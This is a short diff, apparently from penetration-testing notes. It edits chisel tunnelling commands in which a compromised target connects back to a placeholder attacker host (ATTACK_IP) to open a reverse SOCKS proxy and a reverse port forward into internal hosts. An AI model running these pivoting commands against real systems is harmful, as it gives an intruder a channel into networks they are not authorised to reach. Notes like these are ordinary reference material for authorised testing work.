@@ -6,7 +6,7 @@
 
  - Attacker: ./chisel server -p LISTENING_PORT --reverse &
 
- - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:SOCKS &
+ - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:0.0.0.0:1080:SOCKS &
 
  - Target: ./chisel client ATTACK_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT
 
